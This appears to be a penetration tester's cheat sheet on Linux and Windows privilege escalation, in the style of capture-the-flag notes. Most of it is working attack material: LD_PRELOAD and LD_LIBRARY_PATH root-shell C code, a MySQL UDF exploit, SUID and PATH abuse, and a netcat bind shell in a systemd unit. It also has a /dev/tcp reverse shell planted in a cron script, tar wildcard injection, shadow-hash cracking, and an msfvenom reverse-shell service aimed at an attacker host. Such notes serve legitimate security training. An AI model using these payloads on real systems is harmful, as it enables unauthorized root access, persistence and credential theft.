---
title: "Privilege Escalation"
---

<p style="text-align: right">_- last update 18/01/2023 -_</p>

## On linux

### SSH Login with metasploit

connect to the host with metasploit 

```bash
use scanner/ssh/ssh_login
set rhosts 10.10.124.253
set username 10.10.124.253
set username karen
set password Password1
run
```

convert the session to meterpreter

```bash
sessions -u 1
```

show potential privesc exploit

```bash
run post/multi/recon/local_exploit_suggester
```

### Enumeration

#### Automated

There are 3 great script to automate privesc enumerations (test in this order):

* [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
* [linux smart enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
* [LinEnum](https://github.com/rebootuser/LinEnum)
* [linuxprivchecker](https://github.com/linted/linuxprivchecker)
* [linux exploit suggester (included in some of the above)](https://github.com/The-Z-Labs/linux-exploit-suggester)

#### Manual

* `ls /opt /tmp ...` : look around the file system for obvious paths
* `history` : the current shell's history
* `id` : look at the current user and it's rights
* `sudo -l` : look for the sudo rights, maybe a command can be abused
* `uname -a` : detailed system informations (arch, kernel version, distrib, ...)
* `cat /proc/version` : like uname but better
* `cat /etc/issue` : 100% gives the distribution name and version
* `ps -A` : show all processes
* `ps axjf` :  show all processes as tree
* `ps aux` : show processes users
* `env` : show current environment variables
* `cat /etc/passwd` : list all users
* `ifconfig || ip a` : network interfaces of the host
* `[ss|netstat] -a[t|u]` : show all connections (tcp or udp)
* `[ss|netstat] -l[t|u]` : show listening (tcp or udp)
* `[ss|netstat] -s[t|u]` : show stats for each protocol
* `[ss|netstat] -tp` : list connections
* `[ss|netstat] -i` : show interface statistics
* `[ss|netstat] -ano` : display All sockets do Not resolve names and display timers (o)
* `stat /.dockerenv` : if true, you are in a container

Useful finds:

```bash
find / -type d -name config           # config directories
find / -type f -perm 0777             # ...
find / -perm a=x                      # files that are executable by everyone
find /home -user $USER                # files that belongs to $USER
find / -mtime 10                      # files that were modified in the last 10 days
find / -atime 10                      # files that were accessed in the last 10 day
find / -cmin -60                      # files changed within the last hour (60 minutes)
find / -amin -60                      # files accesses within the last hour (60 minutes)
find / -size 50M                      # files with a 50 MB size
find / -writable -type d 2>/dev/null  # world-writeable folders
find / -perm -222 -type d 2>/dev/null # world-writeable folders
find / -perm -o w -type d 2>/dev/null # world-writeable folders
find / -perm -o x -type d 2>/dev/null # world-executable folders
find / -name *.py                     # python files
find / -perm -u=s -type f 2>/dev/null # files with the SUID bit set
```

### Kernel Exploits

Use [linux exploit suggester script](https://github.com/jondonas/linux-exploit-suggester-2) which proposes kernel exploit to privesc.

**WARNING:** this should be a last resort, they often are very unstable.

### SUID

The following oneliner is listing every file with SGID or SUID flag enabled, ignoring errors and outputing resutis in a file.

```bash
find / -perm -4000 -o -perm -2000 -exec ls -ldb {} \; 2>/dev/null | tee suid_sgid_files.txt

find / -perm -u=s -o -perm -g=s -exec ls -ldb {} \; 2>/dev/null | tee suid_sgid_files.txt
```

Then look for the binaries in [GTFOBins (capabilities)](https://gtfobins.github.io/#+capabilities)

([AutoSUID](https://github.com/IvanGlinkin/AutoSUID) is automating this process)

### Capabilities

Look for binary with capabilities set for your user

```bash
getcap -r / 2>/dev/null
```

Then look for the binaries in [GTFOBins (capabilities)](https://gtfobins.github.io/#+capabilities)

### Shell abuse

Execute `strings` on the binary

If you find a shell command (without absolute path), see if PATH can be abused.

```bash
cat > mycommand <<EOF
> #!/bin/bash
> cp /bin/bash /tmp/rootbash
> chmod +xs /tmp/rootbash
> EOF
```

If no, you can overrite a full path using a bash function (bash version lower than 4.2)

```bash
function /usr/sbin/mycommand { /bin/bash -p; }
export -f /usr/sbin/mycommand
```

When in debugging mode, Bash lower than 4.4 uses the environment variable PS4 to display an extra prompt for debugging statements.
This can be exploited.

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /my/suid/commmand
```

### Systemctl

If netcat is available and the `systemctl` command can be abused (see [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/)), the following service can be installed to elevate privileges and, even, as a way to create persistance.

```ini
[Service]
Type=oneshot
ExecStart=/bin/sh -c "nc -lp 5555 -e /bin/bash"
[Install]
WantedBy=multi-user.target
```

### NFS root squashing

On the target, look for nfs exports

```bash
cat /etc/exports
```

Find the nfs version using rpcinfo

```bash
rpcinfo $TARGET_IP |egrep "service|nfs"
```

On attacker machine, mount the nfs volume

```bash
mkdir $NFS_MOUNTPOINT
sudo mount.nfs -o nolock,rw,vers=$NFS_VERSION $TARGET_IP:$TARGET_EXPORT $NFS_MOUNTPOINT
```

Generate a simple exploit as root

```bash
# either generate an exploit
sudo msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o $NFS_MOUNTPOINT/shell

# or simply copy a bash shell from attacker or victim's host
sudo cp /bin/bash $NFS_MOUNTPOINT/shell
```

Then, make it SUID

```bash
sudo chmod +xs $NFS_MOUNTPOINT/shell
```

On the target, execute the malicious binary

### Mysql UDF

* mysql is installed as root
* "root" user for the service does not have a password assigned

Then you can install a "User Defined Function" (UDF) to run system commands as
root.

Download [the raptor udf2 exploit](https://www.exploit-db.com/exploits/1518)

```bash
curl -o raptor_udf2.c "https://www.exploit-db.com/download/1518"
```

Compile it

```bash
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Connect mysql as root user

```bash
mysql -u root
```

Install the UDF

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to privesc (here copy a root shell with suid)

```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

Then enter the shell

```bash
/tmp/rootbash -p
```

### Readable shadow file

If `/etc/shadow` and `/etc/passwd` files are readable, get them locally.

Unshadow the result

```bash
unshadow passwd shadow > unshadowed.txt
```

Keep only the hashes

```bash
cut -d ':' -f 2 unshadowed.txt | tee hashes.txt
```

Break with john (find format in [hashcat examples](https://hashcat.net/wiki/doku.php?id=example_hashes)).

```bash
john --wordlist=rockyou.txt hashes.txt
```

( _WARNING: the `=` character is mandatory in john's arguments !!!_ )

### Writable shadow file

If `/etc/shadow` is writable, you can change a user's password.

```bash
mkpasswd -m sha-512 $PASSWORD
```

### SUID Apache2

If Apache2 can run as root, we can read the first line of any file. For exemple,
outputing the root hash of shadow file.

```bash
sudo apache2 -f /etc/shadow
```

### Sudo's LD_PRELOAD inheritance

Verify that sudo inherit the `LD_PRELOAD` variable

```bash
sudo -l | grep env_keep
```

Here is a simple exploit (called `preload.c`)

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

Build this exploit

```bash
gcc -nostartfiles -shared -fPIC -o /tmp/preload.so preload.c
```

Run one of the allowed programs showed by `sudo -l` with the preload object.

```bash
sudo LD_PRELOAD=/tmp/preload.so $SUDOABLEPROGRAM
```

This should give you instantly a root shell.

### Sudo's LD_LIBRARY_PATH inheritance

Verify that sudo inherit the `LD_LIBRARY_PATH` variable

```bash
sudo -l | grep env_keep
```

Here is a simple exploit you can call `library_path.c`

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

Identify a library that your vulnerable program (one of `sudo -l`) is using

```bash
ldd $(which $SUDOABLEPROGRAM)
```

Impersonate the targeted library with your exploit

```bash
gcc -o /tmp/libs/$TARGETLIB -shared -fPIC library_path.c
```

Then run the program with your malicious library

```bash
sudo LD_LIBRARY_PATH=/tmp/libs/$TARGETLIB $SUDOABLEPROGRAM
```

### Crontabs

#### Writable script

If you are able to overwrite a script run by crontab as root.

You can use a common payload

```bash
echo "bash -i >& /dev/tcp/$PIRATEIP/$PIRATEPORT 0>&1" > $VULNERABLESCRIPT
```

#### Permissive PATH

* a cron is running as root
* it's using this path to discovert an executable position
* the PATH contain a writable directory

We can abuse the path to create a malicious binary in a valid PATH directory.

#### Abusing wildcard

The following command

```bash
tar czf /tmp/backup.tar.gz *
```

Can be exploited by creating 2 files

```bash
touch ./--checkpoint=1
touch ./--checkpoint-action=exec=shell.elf
```

The command that will be run:

```bash
tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=shell.elf
```

## On Windows

### Services

Generate a backdoor service

```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=$ATTACKER_IP lport=$ATTACKER_PORT -f exe-service -o malicious.exe
```

